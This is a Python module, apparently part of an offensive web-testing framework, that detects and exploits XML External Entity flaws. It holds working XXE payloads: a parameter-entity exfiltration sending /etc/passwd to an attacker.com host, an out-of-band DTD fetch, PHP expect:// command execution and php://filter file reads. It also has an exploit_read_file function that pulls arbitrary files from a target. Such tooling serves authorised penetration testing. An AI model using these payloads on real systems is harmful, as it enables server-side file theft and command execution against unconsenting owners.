#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - XXE Module
XML External Entity detection and exploitation
"""

import os
import sys
import re

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import Payloads, Colors


class XXEModule:
    """XXE Testing Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "XXE"
        
        # XXE indicators
        self.xxe_indicators = [
            'root:x:',
            'bin:x:',
            'daemon:x:',
            '/etc/passwd',
            '/bin/bash',
            'for 16-bit app support',
            '[extensions]',
            '<!ENTITY',
            'SYSTEM',
            'PUBLIC',
            'file://',
            'php://',
        ]
    
    def test(self, url: str, method: str, param: str, value: str):
        """Test for XXE"""
        # Test basic XXE
        self._test_basic(url, method, param, value)
        
        # Test with different techniques
        self._test_variants(url, method, param, value)
    
    def test_url(self, url: str):
        """Test URL for XXE"""
        pass
    
    def _test_basic(self, url: str, method: str, param: str, value: str):
        """Test for basic XXE"""
        payloads = Payloads.XXE_PAYLOADS
        
        for payload in payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                
                if method.upper() == 'GET':
                    data = {param: payload}
                    response = self.requester.request(url, method, data=data, headers=headers)
                else:
                    response = self.requester.request(url, method, data=payload, headers=headers)
                
                if not response:
                    continue
                
                response_text = response.text
                
                # Check for XXE indicators
                match_count = sum(1 for ind in self.xxe_indicators if ind.lower() in response_text.lower())
                
                if match_count >= 2:
                    from core.engine import Finding
                    finding = Finding(
                        technique="XXE (XML External Entity)",
                        url=url,
                        severity='CRITICAL',
                        confidence=0.9,
                        param=param,
                        payload=payload[:100],
                        evidence="XXE vulnerability detected - file content retrieved",
                    )
                    self.engine.add_finding(finding)
                    return
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'XXE test error: {e}')}")
    
    def _test_variants(self, url: str, method: str, param: str, value: str):
        """Test XXE variants"""
        variants = [
            # Parameter entity
            '''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
]>
<data>&exfil;</data>''',
            
            # OOB (Out-of-band)
            '''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>''',
            
            # PHP expect
            '''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>''',
            
            # PHP filter
            '''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>''',
        ]
        
        for payload in variants:
            try:
                headers = {'Content-Type': 'application/xml'}
                response = self.requester.request(url, 'POST', data=payload, headers=headers)
                
                if not response:
                    continue
                
                # Check for indicators
                if 'root:x:' in response.text or 'bin:x:' in response.text:
                    from core.engine import Finding
                    finding = Finding(
                        technique="XXE (Advanced)",
                        url=url,
                        severity='CRITICAL',
                        confidence=0.9,
                        param=param,
                        payload=payload[:100],
                        evidence="XXE variant successful",
                    )
                    self.engine.add_finding(finding)
                    return
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'XXE variant test error: {e}')}")
    
    def exploit_read_file(self, url: str, file_path: str) -> str:
        """Attempt to read file via XXE"""
        payload = f'''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>&xxe;</root>'''
        
        try:
            headers = {'Content-Type': 'application/xml'}
            response = self.requester.request(url, 'POST', data=payload, headers=headers)
            
            if response:
                return response.text
        except Exception as e:
            print(f"{Colors.error(f'XXE file read error: {e}')}")
        
        return None
